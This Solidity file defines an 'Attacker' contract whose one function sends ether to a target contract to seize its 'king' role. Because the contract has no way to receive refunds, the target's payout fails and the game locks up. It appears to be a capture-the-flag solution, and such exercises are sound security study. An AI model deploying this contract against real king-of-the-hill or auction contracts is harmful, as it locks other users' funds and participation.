// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
    function kill_the_king(address payable _targetAddress) external payable {
        (bool success,) = _targetAddress.call{value: msg.value}("");
        if (success) {
            this;
        }
    }
}
